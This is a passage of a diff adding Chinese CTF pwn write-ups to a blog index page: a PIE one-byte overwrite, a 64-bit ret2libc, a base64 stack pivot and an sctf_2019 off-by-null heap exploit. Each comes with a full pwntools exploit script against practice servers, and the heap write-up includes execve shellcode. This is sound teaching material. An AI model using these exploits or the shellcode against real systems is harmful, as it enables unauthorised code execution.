@@ -115,6 +115,456 @@
     
     <div class="recent-post-item">
 
+      <a href="/2023/10/25/NewStar/" class="item-title">NewStar</a>
+      
+      <time datetime="2023-10-25T12:52:55.000Z">
+        2023-10-25
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- p1eee开了pie保护
+可以溢出一字节
+还有个后门函数
+因为代码段和后门函数地址相差是非常近的，只差了一个字节，所以可以直接覆盖返回地址为后门函数地址，返回函数的地址一般都是move rbp ，rsp之类的，所以这里最后一字节改成’\x69’,改成之前的都不行。
+
+expfrom pwn import*
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,29807)
+#p=process(&quot;./pie&quot;)
+context.log_level=&quot;debug&quot;
+payload=&#39;a&#39;*(0x28)+&#39;\x69&#39;
+p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload)
+
+
+#gdb.attach(p)
+#sleep(1)
+
+#p.sendline(payload)
+
+p.interactive()
+
+ret2libc常规的64位的ret2libc题
+区别在于最后的payload -->
+        <!-- </div> -->
+
+        
+        <h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><h5 id="开了pie保护"><a href="#开了pie保护" class="headerlink" title="开了pie保护"></a>开了pie保护</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3cV5.png" alt="image-20231025205617591"></p>
+<h5 id="可以溢出一字节"><a href="#可以溢出一字节" class="headerlink" title="可以溢出一字节"></a>可以溢出一字节</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3gtX.png" alt="image-20231025210358978"></p>
+<h5 id="还有个后门函数"><a href="#还有个后门函数" class="headerlink" title="还有个后门函数"></a>还有个后门函数</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3eks.png" alt="image-20231025210337922"></p>
+<p>因为代码段和后门函数地址相差是非常近的，只差了一个字节，所以可以直接覆盖返回地址为后门函数地址，返回函数的地址一般都是move rbp ，rsp之类的，所以这里最后一字节改成’\x69’,改成之前的都不行。</p>
+<p><img src="https://i0.imgs.ovh/2023/10/25/F3tNU.png" alt="image-20231025210604176"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,29807)
+#p=process(&quot;./pie&quot;)
+context.log_level=&quot;debug&quot;
+payload=&#39;a&#39;*(0x28)+&#39;\x69&#39;
+p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload)
+
+
+#gdb.attach(p)
+#sleep(1)
+
+#p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h5 id="常规的64位的ret2libc题"><a href="#常规的64位的ret2libc题" class="headerlink" title="常规的64位的ret2libc题"></a>常规的64位的ret2libc题</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AAzet.png" alt="image-20231026223501750"></p>
+<h5 id="区别在于最后的payload要在p64-binsh-后面加个ret的参数"><a href="#区别在于最后的payload要在p64-binsh-后面加个ret的参数" class="headerlink" title="区别在于最后的payload要在p64(binsh)后面加个ret的参数"></a>区别在于最后的payload要在p64(binsh)后面加个ret的参数</h5><pre><code class="lang-py">payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2023/10/30/AAUGm.png" alt="image-20231026223815671"></p>
+<h5 id="libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。"><a href="#libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。" class="headerlink" title="libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。"></a>libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。</h5><pre><code class="lang-py"># libc.blukat.me 查询libc版本后手动计算（推荐）
+libc_base   =   puts_addr - 0x080970
+system_addr =   libc_base + 0x04f420b
+in_addr    =   libc_base + 0x1b3d88
+</code></pre>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,27215)
+#p=process(&quot;./ret2libc1&quot;)
+elf=ELF(&#39;./ret2libc1&#39;)
+#libc=ELF(&#39;./libc-2.23.so&#39;)
+#libc=elf.libc
+context.log_level=&quot;debug&quot;
+puts_plt=0x400520
+puts_got=elf.got[&#39;puts&#39;]
+pop_rdi=0x400763
+main=0x400698
+ret=0x4006F1
+payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendlineafter(&#39;again&#39;,payload)
+p.recvuntil(&#39;time&#39;)
+#gdb.attach(p)
+sleep(1)
+puts_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+#puts_addr=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))
+print(hex(puts_addr))
+
+
+base=puts_addr-0x04f420
+#-libc.sym[&#39;puts&#39;]
+system=base+0x080970
+#libc.sym[&#39;system&#39;]
+binsh=base+0x1b3d88
+#libc.search(&#39;bin/sh&#39;).next()
+
+payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
+p.sendlineafter(&#39;again&#39;,payload)
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2023/10/25/NewStar/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2023/10/23/login/" class="item-title">login</a>
+      
+      <time datetime="2023-10-23T12:48:27.000Z">
+        2023-10-23
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 例行检查，这道题是静态的，函数多且看不懂
+第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。
+看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。
+
+payload这样写payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40)
+payload=base64.b64encode(payload)
+
+只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是 -->
+        <!-- </div> -->
+
+        
+        <h5 id="例行检查，这道题是静态的，函数多且看不懂"><a href="#例行检查，这道题是静态的，函数多且看不懂" class="headerlink" title="例行检查，这道题是静态的，函数多且看不懂"></a>例行检查，这道题是静态的，函数多且看不懂</h5><p><img src="https://i.imgs.ovh/2023/10/23/2NN33.png" alt="image-20231023205047486"></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgs.ovh/2023/10/23/2N9ae.png" alt="image-20231023204935533"></h5><h5 id="第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"><a href="#第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。" class="headerlink" title="第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"></a>第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2aClH.png" alt="image-20231023205506057"></p>
+<h5 id="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"><a href="#看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。" class="headerlink" title="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"></a>看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2a21s.png" alt="image-20231023210859918"></p>
+<p><img src="https://i0.imgs.ovh/2023/10/26/Fbv9I.png" alt="image-20231026202306583"></p>
+<h5 id="payload这样写"><a href="#payload这样写" class="headerlink" title="payload这样写"></a>payload这样写</h5><pre><code class="lang-py">payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40)
+payload=base64.b64encode(payload)
+</code></pre>
+<h5 id="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权"><a href="#只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权" class="headerlink" title="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权"></a>只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权</h5><p><img src="https://i0.imgs.ovh/2023/10/26/Fbacj.png" alt="image-20231026205553321"></p>
+<p><img src="https://i0.imgs.ovh/2023/10/26/FoPSJ.png" alt="image-20231026204932010"></p>
+<p><img src="https://i0.imgs.ovh/2023/10/26/FoCMV.png" alt="image-20231026205315054"></p>
+<p><img src="https://i0.imgs.ovh/2023/10/26/FoVdW.png" alt="image-20231026205440817"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*
+import base64
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,29010)
+#p=process(&quot;./login&quot;)
+context.log_level=&quot;debug&quot;
+
+
+shell=0x08049284
+fake_addr=0x811eb40
+#
+payload=&#39;a&#39;*0x4+p32(shell)+p32(fake_addr)
+payload=base64.b64encode(payload)
+#gdb.attach(p)
+sleep(1)
+p.sendlineafter(&#39;Authenticate :&#39;,payload)
+
+#p.sendline(payload)
+
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2023/10/23/login/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2023/10/21/sctf-2019-easy-heap/" class="item-title">sctf_2019_easy_heap</a>
+      
+      <time datetime="2023-10-21T12:16:40.000Z">
+        2023-10-21
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 这道题用off by null解例行检查，保护全开,不能利用got表，只能用hook的地址
+程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：
+PROT_EXEC：允许对内存映射区域进行执行访问。
+PROT_READ：允许对内存映射区域进行读取访问。
+PROT_WRITE：允许对内存映射区域进行写入访问。
+PROT_NONE：禁止对内存映射区域进行任何访问。
+
+当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。
+单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数
+ 按照题解里的流程，先创建一个0x410大小的堆，并接 -->
+        <!-- </div> -->
+
+        
+        <h4 id="这道题用off-by-null解"><a href="#这道题用off-by-null解" class="headerlink" title="这道题用off by null解"></a>这道题用off by null解</h4><h5 id="例行检查，保护全开-不能利用got表，只能用hook的地址"><a href="#例行检查，保护全开-不能利用got表，只能用hook的地址" class="headerlink" title="例行检查，保护全开,不能利用got表，只能用hook的地址"></a>例行检查，保护全开,不能利用got表，只能用hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p>
+<h5 id="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"><a href="#程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。" class="headerlink" title="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"></a>程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。</h5><h5 id="mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："><a href="#mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：" class="headerlink" title="mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："></a>mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：</h5><ul>
+<li>PROT_EXEC：允许对内存映射区域进行执行访问。</li>
+<li>PROT_READ：允许对内存映射区域进行读取访问。</li>
+<li>PROT_WRITE：允许对内存映射区域进行写入访问。</li>
+<li>PROT_NONE：禁止对内存映射区域进行任何访问。</li>
+</ul>
+<h5 id="当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"><a href="#当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。" class="headerlink" title="当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"></a>当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p>
+<h5 id="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"><a href="#单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数" class="headerlink" title="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"></a>单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p>
+<h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h5 id="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址"><a href="#按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址" class="headerlink" title="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址"></a>按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址</h5><pre><code class="lang-py">add(0x410)
+p.recvuntil(&#39;Address &#39;)
+chunk0_addr=int(p.recv(14),16)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p>
+<h5 id="然后再创建四个大小不同的堆"><a href="#然后再创建四个大小不同的堆" class="headerlink" title="然后再创建四个大小不同的堆"></a>然后再创建四个大小不同的堆</h5><pre><code class="lang-py">
+add(0x28)
+add(0x18)
+add(0x4f8)
+add(0x10)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p>
+<h5 id="然后free掉堆0"><a href="#然后free掉堆0" class="headerlink" title="然后free掉堆0"></a>然后free掉堆0</h5><pre><code class="lang-py">dele(0)
+</code></pre>
+<h5 id="然后edit堆2-也就是输入内容，构造下面的unlink"><a href="#然后edit堆2-也就是输入内容，构造下面的unlink" class="headerlink" title="然后edit堆2,也就是输入内容，构造下面的unlink"></a>然后edit堆2,也就是输入内容，构造下面的unlink</h5><pre><code class="lang-py">payload=p64(0)*2+p64(0x420+0x20+0x30)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p>
+<h5 id="在free堆3后，就会unlink合并，四个堆合并在一起"><a href="#在free堆3后，就会unlink合并，四个堆合并在一起" class="headerlink" title="在free堆3后，就会unlink合并，四个堆合并在一起"></a>在free堆3后，就会unlink合并，四个堆合并在一起</h5><pre><code class="lang-py">dele(3) free堆3
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p>
+<h5 id="这里存堆0，堆3的指针都被清掉了。"><a href="#这里存堆0，堆3的指针都被清掉了。" class="headerlink" title="这里存堆0，堆3的指针都被清掉了。"></a>这里存堆0，堆3的指针都被清掉了。</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p>
+<h5 id="再free堆1，堆2"><a href="#再free堆1，堆2" class="headerlink" title="再free堆1，堆2"></a>再free堆1，堆2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p>
+<h5 id="然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。"><a href="#然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。" class="headerlink" title="然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。"></a>然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。</h5><pre><code class="lang-py">add(0x440)
+add(0x510)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p>
+<p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p>
+<p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p>
+<h5 id="然后编辑这两个堆的内容"><a href="#然后编辑这两个堆的内容" class="headerlink" title="然后编辑这两个堆的内容"></a>然后编辑这两个堆的内容</h5><pre><code class="lang-py">payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)
+fill(0,payload)
+fill(1,&#39;\x30&#39;)
+</code></pre>
+<h5 id="编辑完后，这是堆0的"><a href="#编辑完后，这是堆0的" class="headerlink" title="编辑完后，这是堆0的"></a>编辑完后，这是堆0的</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p>
+<h5 id="成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。"><a href="#成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。" class="headerlink" title="成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。"></a>成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p>
+<h5 id="这是堆1的，bin指针修改成了malloc-hook的地址。"><a href="#这是堆1的，bin指针修改成了malloc-hook的地址。" class="headerlink" title="这是堆1的，bin指针修改成了malloc_hook的地址。"></a>这是堆1的，bin指针修改成了malloc_hook的地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p>
+<h5 id="原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址"><a href="#原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址" class="headerlink" title="原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址"></a>原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p>
+<h5 id="再malloc两次，把多余的freechunk拿掉"><a href="#再malloc两次，把多余的freechunk拿掉" class="headerlink" title="再malloc两次，把多余的freechunk拿掉"></a>再malloc两次，把多余的freechunk拿掉</h5><pre><code class="lang-py">add(0x28)#2
+add(0x18)#3
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p>
+<h5 id="再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧"><a href="#再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧" class="headerlink" title="再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧"></a>再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧</h5><pre><code class="lang-py">add(0x28)#5
+payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+fill(5,payload2 + &#39;\n&#39;)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p>
+<h5 id="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。"><a href="#再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。" class="headerlink" title="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。"></a>再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。</h5><pre><code class="lang-py">add(0x18)#6
+edit(6,p64(st_addr + 0x10) + &#39;\n&#39;)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p>
+<h5 id="这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址"><a href="#这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址" class="headerlink" title="这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址"></a>这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p>
+<h5 id="最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。"><a href="#最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。" class="headerlink" title="最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。"></a>最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,29573)
+#p=process(&quot;./sctf_2019_easy_heap&quot;)
+context(arch=&#39;amd64&#39;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.27.so&#39;)
+
+def add(size):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;Size: &#39;,str(size))
+
+def fill(index,content):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+    p.sendlineafter(&#39;Content: &#39;,content)
+
+def dele(index):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+
+p.recvuntil(&#39;Mmap: &#39;)
+mmap_addr=int(p.recv(12),16)
+print(hex(mmap_addr))
+
+add(0x410) 
+add(0x28)
+add(0x18)
+add(0x4f8)
+add(0x10)
+
+dele(0)
+
+payload=p64(0)*2+p64(0x420+0x20+0x30)
+fill(2,payload)
+
+dele(3)
+dele(1)
+dele(2)
+
+add(0x440)
+add(0x510)
+
+payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)
+fill(0,payload)
+fill(1,&#39;\x30&#39;)
+
+add(0x28)#2
+add(0x18)#3
+
+add(0x28)#5
+add(0x18)#6
+
+payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+
+fill(5,payload2)
+fill(6,p64(mmap_addr + 0x10))
+
+add(0x10)
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2023/10/21/sctf-2019-easy-heap/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2023/10/16/gyctf_2020_some_thing_exceting/" class="item-title"></a>
+      
+      <time datetime="2023-10-16T12:27:11.330Z">
+        2023-10-16
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- gyctf_2020_some_thing_exceting有点奇怪的UAF题，double free 有点奇怪做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来
+flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8
+除了没有edit函数，其他都有add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。
+show函数，将两个地址的内容都打印出来，后期是用来打印flag
+dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free
+漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次bss=0x6020a8-0x10
+
+add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)
+add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;)
+
+dele(0)
+
+
+
+dele(1)
+
+这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零
+
+dele(0) -->
+        <!-- </div> -->
+
+        
